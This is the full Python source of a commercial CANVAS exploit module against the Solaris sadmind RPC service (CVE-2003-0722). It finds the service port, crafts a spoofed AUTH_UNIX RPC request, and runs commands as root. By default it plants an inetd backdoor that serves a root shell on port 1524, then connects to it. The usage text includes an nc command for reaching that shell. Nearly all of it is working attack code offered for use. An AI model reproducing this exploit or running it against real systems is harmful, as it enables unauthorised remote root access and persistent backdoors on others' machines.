#! /usr/bin/env python

#
# CANVAS sadmind exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#fully updated to use setProgress

import os,getopt
import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import socket
from exploitutils import *
sys.path.append('encoder')
import addencoder
sys.path.append("shellcode")
sys.path.append("gui")
import win32shell
from tcpexploit import tcpexploit
import canvasengine
import time
from sunrpc import *

from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet

BDPORT=1524

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="Sep 16, 2003"
DOCUMENTATION["CERT Advisory"]=""
DOCUMENTATION["CVE Name"] = "CVE-2003-0722"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0722"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F56740"

DESCRIPTION="Sadmind Remote Exploit for Solaris"
NAME="sadmind"
VERSION="1.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Solaris"] ]

GTK2_DIALOG="dialog.glade2"

NOTES=""" 

This is a 5 year old exploit. According to legend, Sun was told of this
exploit and told everyone to just use auth_des as a requirement. However, it
still gets remote root by default.

Credits go to many people, as many people have found this, but Mark Zielinski
was probably one of the first, according to rumors.

This expoit DOES NOT RETURN BACK the results of your command! They get executed blindly.

"""

CHANGELOG="""

"""

SADMIND_PROGRAM=100232
SADMIND_VERSION=10
SADMIND_PROC=1
SADMIND_PROTO="udp"
PING=0


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit


def sadmind_ping(host,port,getsock=None):
    if getsock==None:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    else:
        s=getsock.getudpsock()
    s.connect((host, port))
    header=SRPCCallHeaderUDP(SADMIND_PROGRAM,SADMIND_VERSION,PING)
    s.sendall(header)
    #print "Sleeping for 3 seconds to recv ping"
    import select
    #print "Selecting"
    if getsock:
        ret=s.isactive()
        if ret:
            retList=[s]
    else:
        retList=select.select([s],[],[],2.0)
    #print "Done select"
    if s not in retList[0]: 
        return 0
    #our socket has data waiting...
    #print "Recving data"
    data=sunrpc_recv_udp(s)
    if len(data)<24:
        return 0
    print hexprint(data[20:24])
    #false positive on my linux box. What is listening on that port?!?
    value=str2bigendian(data[20:24])
    #print "Value=%d"%value
    if value==0:
        return 1
    return 0

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        #list of potential sadmind ports to check first
        self.portlist=[32774,32775]
        self.port=0
        self.host=""
        self.setVersions()
        self.version=1
        #self.command="/usr/bin/touch /tmp/CANVASWORKED;"
        self.command=""
        self.attackhost="CANVAS"
        self.attackdomain=""
        self.rcv_port="111"
        
        self.name=NAME        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[0]=("Almost Any Solaris",None)
        
    def test(self):
        """
        Sees if it can find sadmind on a port
        """
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface
        port=self.port
        if port==0:
            try:
                #try a few default ports first
                for p in self.portlist:
                    try:
                        self.log("Trying sadmind on port %d"%p)
                        if sadmind_ping(self.host,p,getsock=self):
                            self.log("Found sadmind on port %d"%p)
                            port=p
                            break
                    except:
                        import traceback
                        pass
                        #traceback.print_exc(file=sys.stdout)

                if port==0:        
                    #go to the portmapper if we haven't found it yet
                    port=SRPCgetport(self.host,SADMIND_PROGRAM,SADMIND_VERSION,SADMIND_PROTO)
                    self.log("portmapper returned %d"%port)
            except:
                pass

        if port==0 or port==None:
            self.log("Not able to automatically get the port.")
            return 0
        self.log("Found port %d"%port)
        self.port=port
        return 1
        
    def run(self):
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface

        if "host" in self.argsDict:
            self.attackhost=self.argsDict["host"]
        if "domain" in self.argsDict:
            self.attachdomain=self.argsDict["domain"]
        self.command = "echo ingreslock stream tcp6 nowait root /bin/sh sh -i>>/tmp/.huhu;inetd -s /tmp/.huhu;rm -f /tmp/.huhu"
        if "command" in self.argsDict:
            self.command = self.argsDict["command"]
        if "rcv_port" in self.argsDict:
            self.rcv_port = self.argsDict["rcv_port"]

        print "Trying command: " + self.command

        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
        port=self.port
        if port==0:
            try:
                #try a few default ports first
                for p in self.portlist:
                    try:
                        self.log("Trying sadmind on port %d"%p)
                        if sadmind_ping(self.host,p,getsock=self):
                            self.log("Found sadmind on port %d"%p)
                            port=p
                            break
                    except:
                        import traceback
                        pass
                        #traceback.print_exc(file=sys.stdout)

                if port==0:        
                    #go to the portmapper if we haven't found it yet
                    self.log("Going to portmapper to find port...")
                    port=SRPCgetport(self.host,SADMIND_PROGRAM,SADMIND_VERSION,SADMIND_PROTO)
                    self.log("Portmapper query returned %d"%port)
            except:
                pass

            
        self.setInfo("%s attacking %s:%d"%(NAME,self.host,int(self.port)))

        if port==0 or port == None:
            self.log("Not able to automatically get the port.")
            self.setInfo("%s attacking %s:%d (failed)"%(NAME,self.host,int(self.port)))
            return 0
        self.setProgress(20)
        
        self.port=port
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s=self.getudpsock()
            s.connect((self.host, self.port))
            s.send(self.makesploit())
            # Put read loop here
            data=sunrpc_recv_udp(s)
            #self.log("Data returned=%s"%\prettyprint(data))
            self.setProgress(40)
            if data.count("Security exception on host "):
                self.log("Attack reported wrong hostname error. Trying with correct hostname.")
                newhost=data.split("Security exception on host ")[1].split(".")[0]
                self.attackhost=newhost
                self.log("Using new attackhost: %s"%newhost)
                #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s=self.getudpsock()
                s.connect((self.host, self.port))
                s.sendall(self.makesploit())
                # Put read loop here
                data=sunrpc_recv_udp(s)
                #self.log("Data returned=%s"%prettyprint(data))
                self.setProgress(60)
                if data.count("Security exception on host "):
                    self.log("Even this new attackhost %s did not work. Domain is wrong, or port 111 is not open internally"%newhost)
                    return 0
                else:
                    self.log("Sadmind returned success response!")
                    if len(self.command) > 0:
                        self.log("Sadmind thinks it worked! You won't be getting the result of your command, however.")
                        self.setInfo("%s attacked %s:%d (success)"%(NAME,self.host,self.port))
                        return 1
                    
                    self.log("[*]      trying to connect to our inetd backdoor ...     [*]")
                    self.log("[*]      Sleeping for 4 seconds...")
                    time.sleep(4)
                    self.log("[*]      Awake...attempting to connect to backdoor port")
                    app=self.engine.getModuleExploit("unixshellfromport")
                    app.link(self)
                    app.argsDict["port"]=BDPORT
                    shell=app.run()
                    if not shell:
                        self.log("Failed to connect to backdoor - attack did not work?")
                        return 0
                    
                    self.log("You'll want to run this: PID=`ps -aef| grep inetd | grep canvas666 | grep -v grep| awk {'print $2'}`; export PID; kill -9 $PID;")
                    return shell
                
            s.close()
        except:
            import traceback
            traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket or some othe error - service not available?")
            self.setInfo("%s attacked %s:%d (failed)"%(NAME,self.host,int(self.port)))
        
            return 0
        self.setInfo("%s attacking %s:%d (failed)"%(NAME,self.host,self.port))
        return 0
    
    def makesploit(self):
        """
        For some reason no matter what we overwrite the function pointer with, we actually execute
        our "what" string...which we can use to jump backwards into our search shellcode

        """
        host=self.attackhost
        domain=self.attackdomain
        #need to be tcp ports owned by root, not tisoctle ports
        #111 should work if portmapper is up
        snd_port=self.rcv_port
        rcv_port=snd_port
        
        #command to execute
        #command="/tmp/ksh -c \"%s\""%(self.command.replace("\"","\\\""))
        if len(self.command) > 0:
            command="/bin/ksh -c \"%s\""%(self.command.replace("\"","\\\""))
        else:
            command="/bin/ksh -c \"echo \\\"ingreslock stream tcp nowait root /bin/sh sh -i\\\" >> ./canvas666;inetd -s ./canvas666;rm -f ./canvas666\""
        
        sploitstring=""
        #unix auth
        sploitstring+=SRPCCallHeaderUDP_UNIX(SADMIND_PROGRAM,SADMIND_VERSION,SADMIND_PROC,self.attackhost)

        
        sploitstring+="\x00"*28
        sploitstring+=big_order(6)
        sploitstring+="\x00"*12
        sploitstring+=big_order(4)
        sploitstring+=big_order(0)
        sploitstring+=big_order(4)
        sploitstring+="\x00"*12
        sploitstring+=big_order(4)
        sploitstring+="\x00"*(48)
        sploitstring+=big_order(2000)
        sploitstring+=sunrpcstr("ADM_FW_VERSION")
        sploitstring+=big_order(3)
        sploitstring+=big_order(4)
        sploitstring+=big_order(1)
        sploitstring+="\x00"*8
        sploitstring+=sunrpcstr("ADM_REQUESTID")
        sploitstring+=big_order(9)
        sploitstring+=big_order(0x12)
        sploitstring+=sunrpcstr("12345:123456789:1")
        sploitstring+=big_order(0)*2
        sploitstring+=sunrpcstr("ADM_CLASS")
        sploitstring+=big_order(9)
        sploitstring+=big_order(7)
        sploitstring+=sunrpcstr("system")
        sploitstring+="\x00"*8
        sploitstring+=sunrpcstr("ADM_CLASS_VERS")
        sploitstring+=big_order(9)
        sploitstring+=big_order(4)
        sploitstring+=sunrpcstr("2.1")
        sploitstring+="\x00"*8
        sploitstring+=sunrpcstr("ADM_METHOD")
        sploitstring+=big_order(9)
        sploitstring+=big_order(8)
        sploitstring+=sunrpcstr("admpipe")
        sploitstring+="\x00"*8
        sploitstring+=sunrpcstr("ADM_CLIENT_HOST")
        sploitstring+=big_order(9)
        sploitstring+=big_order(len(host)+1)
        sploitstring+=sunrpcstr(host)
        sploitstring+="\x00"*8
        #Why is this not null padded?!
        sploitstring+=big_order(8)
        sploitstring+=("ADM_HOST")
        sploitstring+=big_order(9)
        sploitstring+=big_order(len(self.host)+1)
        sploitstring+=sunrpcstr(self.host)
        sploitstring+="\x00"*8
        sploitstring+=sunrpcstr("ADM_CLIENT_DOMAIN")
        sploitstring+=big_order(9)
        sploitstring+=big_order(len(domain)+1)
        #this is a bit weird
        if domain!="":
            sploitstring+=sunrpcstr(domain)
        else:
            sploitstring+="\x00"*4
        sploitstring+="\x00"*8
        sploitstring+=sunrpcstr("ADM_FENCE")
        sploitstring+=big_order(3)
        sploitstring+=big_order(4)
        sploitstring+="\x00"*12
        sploitstring+=big_order(8)
        sploitstring+="snd_port"
        #no null?
        sploitstring+=big_order(9)
        sploitstring+=big_order(len(snd_port)+1)
        sploitstring+=sunrpcstr(snd_port)
        sploitstring+="\x00"*8
        sploitstring+=big_order(8)
        sploitstring+="rcv_port"
        sploitstring+=big_order(9)
        sploitstring+=big_order(len(rcv_port)+1)
        sploitstring+=sunrpcstr(rcv_port)        
        sploitstring+="\x00"*8
        sploitstring+=sunrpcstr("cmd")
        sploitstring+=big_order(9)
        sploitstring+=big_order(len(command)+1)
        #should just be sunrpcstr, but that doens't work!
        if 0:
            sploitstring+=big_order(len(command))
            sploitstring+=command
            padlen=4-len(command)%4
            if padlen==4: padlen=0
            sploitstring+="\x00"*padlen
            print "length=%d pad=%d"%(len(command),padlen)
        else:
            sploitstring+=sunrpcstr(command,nonull=1)
        
        sploitstring+="\x00"*8
        sploitstring+=big_order(0x10)
        sploitstring+="netmgt_endofargs"
        
        self.log("Host=*%s* Domain=*%s*"%(host,domain))
        self.log("Using command length %d: %s"%(len(command),command))
        
        return sploitstring

    def usage(self):
        print "Usage: "+sys.argv[0]+" -t target -v version [-O host:hostname] [-D domain:domainname] [-p port] [-O command:command] [-O rcv_port:111]"
        print "Example: exploits/sadmind/sadmind.py -t 192.168.1.200 ; nc -vv 192.168.1.200 ingreslock"

if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)
